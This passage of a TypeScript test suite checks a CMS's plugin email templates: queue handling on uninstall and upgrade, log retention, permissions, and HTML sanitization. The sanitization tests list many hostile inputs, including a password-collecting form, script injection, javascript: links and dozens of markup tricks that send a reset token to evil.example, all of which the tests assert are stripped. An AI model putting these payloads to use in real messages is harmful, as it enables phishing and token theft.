      await send({ template: 'ticket.reply', to: { address: 'a@example.com' }, variables: { subject: 'a', link: 'https://example.com/t' } })

      // Removing a plugin reloads every other one.
      const removal = h.cms('/admin/api/cms/plugins/acme.other', { method: 'DELETE', cookie: owner })
      expect(await timesMissing(REPLY_KEY, removal)).toBe(0)
      expect(await timesMissing(REPLY_KEY, install(BOTH, { version: '1.1.0' }))).toBe(0)

      let calls = 0
      await drain(async () => { calls += 1; return null })
      expect(calls).toBe(1)
      expect((await listMailActivity(h.db)).entries[0]).toMatchObject({ status: 'sent' })
    })

    it('deletes the owner\'s edit of a template an upgrade drops, and fails what was waiting for it', async () => {
      await install(BOTH)
      await readyConnector()
      const openedKey = `plugin.${PLUGIN_ID}~ticket.opened`
      for (const key of [openedKey, REPLY_KEY]) {
        await h.cms(`/admin/api/cms/mail/templates/${key}`, { method: 'PUT', cookie: owner, json: { subject: 'Edited', body: 'Edited' } })
      }
      await send({ template: 'ticket.opened', to: { address: 'a@example.com' }, variables: { subject: 'a' }, reference: 'dropped' })

      expect((await install(BOTH, { version: '1.1.0', mail: { templates: [TEMPLATES[0]] } })).status).toBeLessThan(300)
      expect((await h.db<{ template_key: string }>`select template_key from mail_templates`).rows.map((row) => row.template_key))
        .toEqual([REPLY_KEY])
      let calls = 0
      await drain(async () => { calls += 1; return null })
      expect(calls).toBe(0)
      expect(await heard()).toEqual([
        { event: 'mail.failed', template: 'ticket.opened', to: { address: 'a@example.com' }, reference: 'dropped', reason: 'template_removed' },
      ])
    })

    it('leaves an email that is being handed over to finish when its plugin is uninstalled, under the plugin\'s name', async () => {
      await install(BOTH)
      await readyConnector()
      await send({ template: 'ticket.opened', to: { address: 'first@example.com' }, variables: { subject: 'a' } })
      await send({ template: 'ticket.opened', to: { address: 'second@example.com' }, variables: { subject: 'a' } })
      const carried: string[] = []
      await drain(async (_c, _s, mail) => {
        carried.push(mail.to)
        // The uninstall lands while the first email is with the provider.
        if (carried.length === 1) await h.cms(`/admin/api/cms/plugins/${PLUGIN_ID}`, { method: 'DELETE', cookie: owner })
        return null
      })
      expect(carried).toEqual(['first@example.com'])
      expect((await h.db`select id from mail_queue`).rows).toHaveLength(0)
      const entries = (await listMailActivity(h.db)).entries
      expect(entries.find((entry) => entry.to === 'first@example.com')).toMatchObject({ status: 'sent', sentBy: 'Help Desk' })
      expect(entries.find((entry) => entry.to === 'second@example.com')).toMatchObject({
        status: 'failed', error: 'The plugin that asked for this email was uninstalled before it was sent.', sentBy: 'Help Desk',
      })
    })

    it('takes an uninstalled plugin\'s waiting email out of the queue', async () => {
      await install(BOTH)
      await readyConnector()
      await send({ template: 'ticket.opened', to: { address: 'a@example.com' }, variables: { subject: 'a' } })
      await h.cms(`/admin/api/cms/plugins/${PLUGIN_ID}`, { method: 'DELETE', cookie: owner })
      expect((await h.db`select id from mail_queue`).rows).toHaveLength(0)
      expect((await listMailActivity(h.db)).entries[0]).toMatchObject({
        status: 'failed', error: 'The plugin that asked for this email was uninstalled before it was sent.',
      })
    })
  })

  describe('what a template can put in an email', () => {
    const key = `plugin.${PLUGIN_ID}~any`
    /** Any key without a `~` is one of the site's own templates. */
    const CORE_KEY = 'member.reset'
    const body = (html: string) => html.slice(html.indexOf('<body'))
    const render = (templateBody: string, variables: Record<string, string> = {}, templateKey = key) =>
      body(renderMailTemplate({ key: templateKey, subject: 'S', body: templateBody }, { 'site.name': 'Site', ...variables }).html)

    it('lets raw HTML add no form, script, frame, style or handler, in a plugin\'s template or the core\'s', () => {
      const hostile = [
        'Hello.',
        '<form action="https://evil.example/collect"><input name="password"><button>Sign in</button></form>',
        '<script>alert(1)</script>',
        '<iframe src="https://evil.example/"></iframe>',
        '<style>p { display: none }</style>',
        '<p onclick="alert(1)" style="position:fixed">text</p>',
      ].join('\n\n')
      for (const templateKey of [key, CORE_KEY]) {
        const html = render(hostile, {}, templateKey)
        for (const banned of ['<form', '<input', '<button', '<script', '<iframe', 'onclick', 'position:fixed', 'evil.example']) {
          expect(html).not.toContain(banned)
        }
        expect(html).toContain('Hello.')
      }
    })

    it('takes a variable as a link only when it is the whole address, however the attribute is quoted', () => {
      const evil = { link: 'javascript:alert(1)' }
      for (const anchor of ['<a href="{link}">x</a>', "<a href='{link}'>x</a>", '<a href={link}>x</a>', '[x]({link})']) {
        expect(render(anchor, evil)).not.toContain('javascript:')
        expect(render(anchor, { link: 'https://example.com/t/1' })).toContain('href="https://example.com/t/1"')
      }
      for (const anchor of ["<a href='https://evil.example/?q={link}'>x</a>", '[x](https://evil.example/?q={link})']) {
        const html = render(anchor, { link: 'secret' })
        expect(html).not.toContain('evil.example')
        expect(html).toContain('href="#"')
      }
    })

    it('gives a secret value to no address but its own, whatever the markup tries', () => {
      const SECRET = 'https://site.example/reset?token=single-use-secret'
      const attempts = [
        // Quoting, spacing and case a second reader of the markup could take differently.
        `<a href='https://evil.example/?t={link}'>x</a>`,
        '<a href=https://evil.example/?t={link}>x</a>',
        '<a href = "https://evil.example/?t={link}">x</a>',
        '<A HREF="https://evil.example/?t={link}">x</A>',
        '<a href="https://evil.example/?t={link}\n">x</a>',
        '<a\nhref="https://evil.example/\n?t={link}">x</a>',
        '<a href="&#104;ttps://evil.example/?t={link}">x</a>',
        '<a href="https://evil.example/?t=&#x7b;link&#x7d;">x</a>',
        '<a href="https://evil.example/?t=&lbrace;link&rbrace;">x</a>',
        '<a href=`https://evil.example/?t={link}`>x</a>',
        '<a href="x" href="https://evil.example/?t={link}">x</a>',
        '<a title="\'>" href="https://evil.example/?t={link}">x</a>',
        '<a href="//evil.example/?t={link}">x</a>',
        '<a href="{link}@evil.example/">x</a>',
        '<a href="https://evil.example/#{link}">x</a>',
        // Attributes other than href and src that take an address.
        '<img srcset="https://evil.example/?t={link} 1x" src="https://example.com/a.png">',
        '<img src="https://evil.example/?t={link}">',
        '<table background="https://evil.example/?t={link}"><tr><td>x</td></tr></table>',
        '<form action="https://evil.example/?t={link}"><button formaction="https://evil.example/?t={link}">x</button></form>',
        '<svg><a xlink:href="https://evil.example/?t={link}"><text>x</text></a></svg>',
        '<p style="background:url(https://evil.example/?t={link})">x</p>',
        '<style>p { background: url("https://evil.example/?t={link}") }</style>',
        '<a href="#" ping="https://evil.example/?t={link}">x</a>',
        '<link rel="stylesheet" href="https://evil.example/?t={link}">',
        '<base href="https://evil.example/?t={link}">',
        '<meta http-equiv="refresh" content="0;url=https://evil.example/?t={link}">',
        '<object data="https://evil.example/?t={link}"></object>',
        '<video poster="https://evil.example/?t={link}"></video>',
        // An address in plain text, which mail clients turn into a link themselves.
        'Go to https://evil.example/?t={link} now',
        'https://evil.example/?t=<b>{link}</b>',
        'https://evil.example/?t=**{link}**',
        '<code>https://evil.example/?t=</code>{link}',
        // Markdown.
        '[x](https://evil.example/?t={link})',
        '[x](<https://evil.example/?t={link}>)',
        '[x](https://evil.example/?t={link} "title")',
        '[x][ref]\n\n[ref]: https://evil.example/?t={link}',
        '<https://evil.example/?t={link}>',
        '[![x](https://evil.example/?t={link})]({link})',
        '[a [b](https://evil.example/?t={link}) c]({link})',
        '![x](https://evil.example/?t={link})',
      ]
      for (const templateKey of [key, CORE_KEY]) {
        for (const attempt of attempts) {
          const rendered = renderMailTemplate({ key: templateKey, subject: 'S', body: attempt }, { 'site.name': 'Site', link: SECRET })
          for (const part of [body(rendered.html), rendered.text]) {
            // The secret may appear as its own address or as words; never beside the other host.
            const leaked = part.split(/["'\s<>()]/).some((piece) => piece.includes('evil.example') && piece.includes('single-use-secret'))
            expect({ attempt, templateKey, leaked }).toEqual({ attempt, templateKey, leaked: false })
          }
          // No attribute at all carries the secret except a link or image address that is exactly it.
          const inAttributes = [...body(rendered.html).matchAll(/\s([a-z:-]+)="([^"]*)"/g)].filter((match) => match[2].includes('single-use-secret'))
          for (const match of inAttributes) {
            expect(['href', 'src']).toContain(match[1])
            expect(match[2].replace(/&amp;/g, '&')).toBe(SECRET)
          }
        }
      }
    })

    it('still makes a link of a variable that is the whole address, in the HTML and the text', () => {
      const link = 'https://site.example/reset?token=abc&x=1'
      for (const source of ['[Reset]({link})', '<a href="{link}">Reset</a>', "<a href=' {link} '>Reset</a>", '<a href="&#x7b;link&#x7d;">Reset</a>']) {
        const rendered = renderMailTemplate({ key, subject: 'S', body: source }, { 'site.name': 'Site', link })
        expect(body(rendered.html)).toContain('href="https://site.example/reset?token=abc&amp;x=1"')
        expect(rendered.text).toBe(`Reset (${link})`)
      }
      // Nor does a subject carry it to another host.
      const subject = renderMailTemplate({ key, subject: 'See https://evil.example/?t={link}', body: 'x' }, { link }).subject
      expect(subject).toBe('See https://evil.example/?t={link}')
      // A value is text in a text node, markup and all, and is not read again for more variables.
      const text = render('Hello {name}.', { name: '<b>{link}</b>', link })
      expect(text).toContain('Hello &lt;b&gt;{link}&lt;/b&gt;.')
    })

    it('loads nothing when a plugin\'s email is opened, and links a plugin\'s template only to https', () => {
      const html = render('![logo](https://tracker.example/pixel.png)\n\n<img src="https://tracker.example/2.png">\n\n[plain](http://example.com/)\n\n[safe](https://example.com/)')
      expect(html).not.toContain('<img')
      expect(html).not.toContain('tracker.example')
      expect(html).not.toContain('http://example.com')
      expect(html).toContain('href="https://example.com/"')
      // The site's own templates may still carry an image.
      expect(render('![logo](https://example.com/logo.png)', {}, CORE_KEY)).toContain('<img')
    })

    it('leaves the core\'s templates as they were', () => {
      const core = listMailTemplateDefinitions().filter((definition) => !definition.key.includes('~'))
      expect(core.length).toBeGreaterThan(0)
      for (const definition of core) {
        const samples = { 'site.name': 'Example', 'site.url': 'https://example.com', ...sampleMailVariables(definition.variables) }
        const html = body(renderMailTemplate({ key: definition.key, subject: definition.defaultSubject, body: definition.defaultBody }, samples).html)
        for (const variable of definition.variables) {
          if (!definition.defaultBody.includes(`]({${variable.name}})`)) continue
          expect(html).toContain(`href="${samples[variable.name]}"`)
        }
        expect(html).not.toContain('{')
        if (definition.defaultBody.includes('**')) expect(html).toContain('<strong>')
      }
    })
  })

  describe('the activity log', () => {
    it('keeps each sender\'s history apart and never drops an email that is still waiting', async () => {
      const insert = (id: string, source: string, status: string) => h.db`
        insert into mail_outbox (id, kind, to_address, subject, status, source, created_at)
        values (${id}, 'k', 'a@example.com', 's', ${status}, ${source}, ${`2026-01-01T00:00:00.${id.slice(-3)}Z`})
      `
      for (let index = 0; index < 5; index += 1) await insert(`core-${String(index).padStart(3, '0')}`, 'core', 'sent')
      for (let index = 0; index < 3; index += 1) await insert(`wait-${String(index).padStart(3, '0')}`, 'acme.noisy', 'queued')
      const KEPT = 2000
      for (let index = 0; index < KEPT; index += 1) {
        await insert(`n${String(index).padStart(4, '0')}-${String(100 + (index % 800))}`, 'acme.noisy', 'sent')
      }
      await recordMail(h.db, { kind: 'k', to: 'a@example.com', subject: 's', status: 'sent', source: 'acme.noisy', sourceLabel: 'Noisy' })

      const count = async (source: string, status: string) =>
        Number((await h.db<{ n: number }>`select count(*) as n from mail_outbox where source = ${source} and status = ${status}`).rows[0].n)
      // The plugin's flood cost the core nothing, and cost the plugin only its own oldest rows.
      expect(await count('core', 'sent')).toBe(5)
      expect(await count('acme.noisy', 'queued')).toBe(3)
      expect(await count('acme.noisy', 'sent')).toBeLessThanOrEqual(KEPT)
      expect(await count('acme.noisy', 'sent')).toBeGreaterThanOrEqual(KEPT - 3)
    })
  })

  describe('an upgrade that asks for more', () => {
    it('is refused until the owner approves emailing any address', async () => {
      const members = [...BASE, 'mail.send']
      expect((await install(members)).status).toBe(201)
      // The new version asks for `mail.send.external`; the approval sent with it is the old one.
      const unapproved = await installPackage(manifest(BOTH, { version: '1.1.0' }), members)
      expect(unapproved.status).toBeGreaterThanOrEqual(400)
      const refused = await send({ template: 'ticket.opened', to: { address: 'a@example.com' }, variables: { subject: 'a' } })
      expect(String(refused.error)).toContain('mail.send.external')

      expect((await installPackage(manifest(BOTH, { version: '1.1.0' }), BOTH)).status).toBeLessThan(300)
      expect(await send({ template: 'ticket.opened', to: { address: 'a@example.com' }, variables: { subject: 'a' } }))
        .toEqual({ status: 'captured' })
    })
  })

  describe('two plugins with related ids', () => {
    it('keeps `acme.desk` from touching the templates of `acme.desk.pro`', async () => {
      await install(BOTH)
      const pro = zipSync({
        'plugin.json': strToU8(JSON.stringify({ ...manifest(BOTH), id: 'acme.desk.pro', name: 'Desk Pro' })),
        'server/index.js': strToU8('export function activate() {}'),
      })
      const formData = new FormData()
      formData.set('file', new File([pro], 'plugin.zip', { type: 'application/zip' }))
      formData.set('grantedPermissions', JSON.stringify(BOTH))
      const req = {
        url: `${ORIGIN}/admin/api/cms/plugins/package`,
        method: 'POST',
        headers: { get: (name: string) => (name.toLowerCase() === 'cookie' ? owner : null) },
        formData: async () => formData,
      } as unknown as Request
      expect((await handleCmsRequest(req, h.db, { uploadsDir })).status).toBe(201)
      const proKey = 'plugin.acme.desk.pro~ticket.reply'
      await h.cms(`/admin/api/cms/mail/templates/${proKey}`, {
        method: 'PUT', cookie: owner, json: { subject: 'Pro wording', body: 'Pro' },
      })

      // A key that would have collided under a dotted prefix is not a template of acme.desk.
      expect(String((await send({ template: 'pro~ticket.reply', to: { address: 'a@example.com' } })).error))
        .toContain('not an email template this plugin declares')

      await h.cms(`/admin/api/cms/plugins/${PLUGIN_ID}`, { method: 'DELETE', cookie: owner })
      expect(getMailTemplateDefinition(REPLY_KEY)).toBeUndefined()
      expect(getMailTemplateDefinition(proKey)).toBeDefined()
      expect((await templates()).find((template) => template.key === proKey)).toMatchObject({ subject: 'Pro wording' })
    })
  })

  describe('the site address', () => {
    it('gives a plugin the configured public address, or null', async () => {
      await install(BASE, { mail: undefined })
      expect(await call('/site')).toEqual({ url: null })
      configurePublicOrigins(['https://shop.example.com'])
      expect(await call('/site')).toEqual({ url: 'https://shop.example.com' })
    })
  })
})
